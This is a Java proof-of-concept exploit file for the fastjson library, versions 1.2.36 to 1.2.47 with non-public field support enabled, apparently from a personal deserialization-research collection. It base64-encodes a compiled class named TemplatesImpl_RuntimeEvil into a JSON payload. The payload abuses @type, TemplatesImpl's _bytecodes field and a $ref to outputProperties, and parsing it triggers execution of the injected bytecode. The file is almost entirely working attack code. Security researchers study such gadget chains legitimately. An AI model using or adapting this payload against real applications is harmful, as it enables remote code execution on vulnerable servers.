package org.exploit.third.fastjson;

import com.alibaba.fastjson.JSON;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

import com.alibaba.fastjson.parser.Feature;
import com.unboundid.util.Base64;
//fastjson>=1.2.36<=1.2.47，需要开启Feature.SupportNonPublicField
//https://godownio.github.io/2024/10/24/fastjson-ref-diao-yong-getter/
public class TemplatesImpl {
    public static void main(String[] args) throws IOException {
        String exp = readClassStr("E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\target\\classes\\TemplatesImpl_RuntimeEvil.class");
        String jsonInput = aposToQuotes("[{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"},{'@type':'com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl',\n" +
                "'_bytecodes':['"+exp+"'],\n" +
                "'_name':'test'," +
                "'_tfactory':{}},\n" +
                "{\"$ref\":\"$[1].outputProperties\"}\n" +
                "]");
        System.out.printf(jsonInput);
        JSON.parse(jsonInput, Feature.SupportNonPublicField);
    }

    public static String aposToQuotes(String json){
        return json.replace("'","\"");
    }

    public static String readClassStr(String cls) throws IOException {
        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/TemplatesImpl_RuntimeEvil.class"));
        return Base64.encode(code1);
    }
}